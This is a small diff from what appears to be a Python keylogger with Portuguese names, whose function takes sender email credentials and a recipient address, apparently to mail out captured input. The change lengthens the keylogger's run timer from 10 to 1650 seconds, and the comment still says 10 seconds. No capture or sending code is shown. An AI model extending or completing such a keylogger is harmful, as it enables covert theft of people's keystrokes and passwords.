@@ -5,7 +5,7 @@ def executar_arquivo(remetente_email, remetente_senha, destinatario_email, subje
     while True:
         try:
             print("#####Executando arquivos pendentes#####\n")
-            timer = Timer(10, interromper_keylogger)  # Define um timer para interromper após 10 segundos
+            timer = Timer(1650, interromper_keylogger)  # Define um timer para interromper após 10 segundos
             timer.start()  # Inicia o timer
         except KeyboardInterrupt:
             print("Encerrando a execução do arquivo.")
